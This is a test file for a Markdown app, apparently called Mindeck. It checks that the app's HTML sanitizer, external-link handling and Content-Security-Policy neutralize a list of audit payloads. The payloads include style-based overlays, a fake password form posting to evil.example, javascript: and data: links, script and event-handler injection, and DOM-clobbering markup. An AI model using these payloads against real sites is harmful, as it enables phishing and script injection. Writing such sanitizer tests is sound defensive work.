import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import { describe, expect, it, vi } from 'vitest'
import { fireEvent, render } from '@testing-library/react'
import { sanitizeFrameHtml, sanitizeHtml } from '@/lib/sanitize'
import { interceptLinks, isExternalUrl, openExternal } from '@/lib/links'
import { renderMarkdown } from '@/features/memory/markdown'
import { Markdown } from '@/components/ui/Markdown'

// The payloads from the audit (FE-SEC-01): foreign Markdown — a PR comment, a
// README, an agent's answer, a notebook — must not restyle, overlay or phish.
const ATTACKS: [name: string, payload: string, mustNotMatch: RegExp][] = [
  ['global <style> rewriting the approval card', '<style>[role=alertdialog] p{font-size:0}[role=alertdialog] p::after{content:"git status"}</style>', /<style|alertdialog|git status/],
  ['<style> that hides the app', '<style>*{display:none}</style>', /<style|display/],
  ['style attribute overlay', '<div style="position:fixed;inset:0;z-index:9999">x</div>', /style=|position/],
  ['borrowed Tailwind classes', '<div class="fixed inset-0 z-50 bg-void">x</div>', /class=|fixed|inset/],
  ['phishing form', '<form action="https://evil.example/c"><input name="pw" type="password" placeholder="Mindeck Cloud password"><button>Sign in</button></form>', /<form|<input|<button|action=|password|evil\.example/],
  ['textarea and select', '<textarea name="t">x</textarea><select><option>a</option></select>', /<textarea|<select|<option/],
  ['iframe', '<iframe src="https://evil.example"></iframe>', /<iframe|evil/],
  ['object and embed', '<object data="x.swf"></object><embed src="x.swf">', /<object|<embed|swf/],
  ['link, meta and base', '<link rel="stylesheet" href="https://evil.example/a.css"><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">', /<link|<meta|<base|evil/],
  ['javascript: link', '<a href="javascript:alert(1)">y</a> <a href="JaVaScRiPt:alert(1)">z</a> <a href=" javascript:alert(1)">w</a>', /javascript/i],
  ['data: link', '<a href="data:text/html,<script>alert(1)</script>">x</a>', /href="data|<script/],
  ['SVG link', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg><svg><style>*{display:none}</style></svg>', /<svg|javascript|<style/],
  ['MathML', '<math><mtext><style>*{display:none}</style></mtext></math>', /<math|<style/],
  ['scripts and handlers', '<script>alert(1)</script><img src=x onerror=alert(1)><a href="#" onclick="alert(1)">x</a>', /<script|onerror|onclick/],
  ['focus, ids and DOM clobbering', '<a id="mindeck" name="x" tabindex="1" autofocus accesskey="s" href="#">x</a>', /id=|name=|tabindex|autofocus|accesskey/],
  ['dialog and popover top layer', '<dialog open>fake</dialog><div popover>p</div><p contenteditable>c</p>', /<dialog|popover|contenteditable/]
]

describe('the Markdown sanitizer (one for every view)', () => {
  it.each(ATTACKS)('neutralizes: %s', (_name, payload, bad) => {
    expect(renderMarkdown(`Thanks for the review!\n\n${payload}`)).not.toMatch(bad)
    expect(sanitizeHtml(payload)).not.toMatch(bad)
  })

  it('Markdown links to javascript: or data: lose their address', () => {
    expect(renderMarkdown('[x](javascript:alert(1)) [y](data:text/html,x) [z](vbscript:x)')).toBe('<p><a>x</a> <a>y</a> <a>z</a></p>\n')
  })

  it('the reproduced audit payload keeps only its text', () => {
    const html = renderMarkdown(
      'Thanks for the review!\n\n<style>[role=alertdialog] p{font-size:0}</style>\n\n<form action="https://evil.example/c"><input name="pw" type="password"><button>Sign in</button></form>'
    )
    expect(html).toBe('<p>Thanks for the review!</p>\nSign in')
  })

  it('keeps what Mindeck itself renders: its own classes, code languages, task lists, details', () => {
    const html = renderMarkdown('[[Note]] #tag ![[a.png]]\n\n```ts\nx\n```\n\n- [x] done\n- [ ] open\n\n<details><summary>More</summary>body</details>')
    expect(html).toContain('class="wikilink unresolved"')
    expect(html).toContain('<span class="md-tag">#tag</span>')
    expect(html).toContain('<img class="embed"')
    expect(html).toContain('<code class="language-ts">')
    expect(html).toContain('<input checked="" disabled="" type="checkbox">')
    expect(html).toContain('<input disabled="" type="checkbox">')
    expect(html).toContain('<details><summary>More</summary>body</details>')
    // A mixed class keeps only the own part; a checkbox from raw HTML is disabled and nameless.
    expect(sanitizeHtml('<span class="md-tag fixed">t</span><code class="language-c++ z-50">c</code><input type="checkbox" name="n">')).toBe(
      '<span class="md-tag">t</span><code class="language-c++">c</code><input type="checkbox" disabled="">'
    )
  })

  it('links open outside without an opener; in-page anchors stay put', () => {
    const html = sanitizeHtml('<a href="https://example.com">a</a><a href="#part">b</a><a href="notes/x.md">c</a><a>d</a>')
    expect(html).toBe(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">a</a><a href="#part">b</a><a href="notes/x.md" target="_blank" rel="noopener noreferrer">c</a><a>d</a>'
    )
  })

  it('notebook HTML output: its own CSS stays (inside its frame), nothing that embeds, redirects or submits', () => {
    const html = sanitizeFrameHtml(
      '<style scoped>.dataframe td{color:red}</style><table class="dataframe"><tr><td style="color:blue">1</td></tr></table><script>parent.mindeck</script><iframe src="x"></iframe><object data="x"></object><embed src="x"><meta http-equiv="refresh" content="0"><link rel="stylesheet" href="x"><base href="https://evil/"><form action="https://evil/"><input name="pw"><button>go</button></form><img src=x onerror=alert(1)>'
    )
    expect(html).toContain('<style>.dataframe td{color:red}</style>')
    expect(html).toContain('<table class="dataframe">')
    expect(html).toContain('style="color:blue"')
    expect(html).not.toMatch(/<script|<iframe|<object|<embed|<meta|<link|<base|<form|<input|<button|onerror|evil/)
  })
})

describe('openExternal and link interception', () => {
  it('opens only web and mail addresses, always without an opener', () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    expect(isExternalUrl('HTTPS://x.dev')).toBe(true)
    expect(isExternalUrl('mailto:a@b.c')).toBe(true)
    for (const url of ['javascript:alert(1)', 'file:///etc/passwd', 'data:text/html,x', 'index.html?x', '//evil.dev', 'vscode://x', '']) {
      expect(openExternal(url)).toBe(false)
    }
    expect(open).not.toHaveBeenCalled()
    expect(openExternal('https://x.dev/a')).toBe(true)
    expect(open).toHaveBeenCalledWith('https://x.dev/a', '_blank', 'noopener,noreferrer')
  })

  it('a click on a link never navigates Mindeck itself', () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    const container = document.createElement('div')
    container.innerHTML = '<a href="index.html?x">rel</a><a href="javascript:alert(1)">js</a><a href="https://example.com"><b>web</b></a><span>t</span>'
    const click = (el: Element) => {
      const e = { target: el, preventDefault: vi.fn() }
      interceptLinks(e as never)
      return e.preventDefault
    }
    expect(click(container.querySelector('a')!)).toHaveBeenCalled()
    expect(click(container.querySelectorAll('a')[1])).toHaveBeenCalled()
    expect(open).not.toHaveBeenCalled()
    expect(click(container.querySelector('b')!)).toHaveBeenCalled()
    expect(open).toHaveBeenCalledWith('https://example.com', '_blank', 'noopener,noreferrer')
    expect(click(container.querySelector('span')!)).not.toHaveBeenCalled()
  })

  it('<Markdown> sanitizes and intercepts links (PR, chat, notebook) unless the view brings its own handler', () => {
    const open = vi.spyOn(window, 'open').mockReturnValue(null)
    const { container, getByText } = render(<Markdown text={'[web](https://example.com) [rel](index.html?x)\n\n<style>*{display:none}</style>'} className="chat-prose" />)
    expect(container.firstElementChild!.className).toBe('md-prose chat-prose')
    expect(container.querySelector('style')).toBeNull()
    expect(fireEvent.click(getByText('rel'))).toBe(false) // default prevented
    expect(open).not.toHaveBeenCalled()
    fireEvent.click(getByText('web'))
    expect(open).toHaveBeenCalledWith('https://example.com', '_blank', 'noopener,noreferrer')

    const own = vi.fn()
    const view = render(<Markdown text="[x](https://x.dev)" onClick={own} />)
    fireEvent.click(view.getByText('x'))
    expect(own).toHaveBeenCalled()
    expect(open).toHaveBeenCalledTimes(1)
  })
})

describe('the desktop CSP (index.html)', () => {
  it('forbids form submissions, plugins and base rewrites; names connect, worker and frame sources', () => {
    const html = readFileSync(resolve(__dirname, '../../../index.html'), 'utf8')
    const csp = /http-equiv="Content-Security-Policy"\s+content="([^"]+)"/.exec(html)![1]
    const directives = Object.fromEntries(csp.split(';').map((d) => d.trim().split(/\s+/)).map(([name, ...v]) => [name, v.join(' ')]))
    expect(directives).toMatchObject({
      'default-src': "'self'",
      'script-src': "'self'",
      'connect-src': "'self'",
      'worker-src': "'self'",
      'frame-src': "'self' about:",
      'object-src': "'none'",
      'base-uri': "'none'",
      'form-action': "'none'"
    })
  })
})
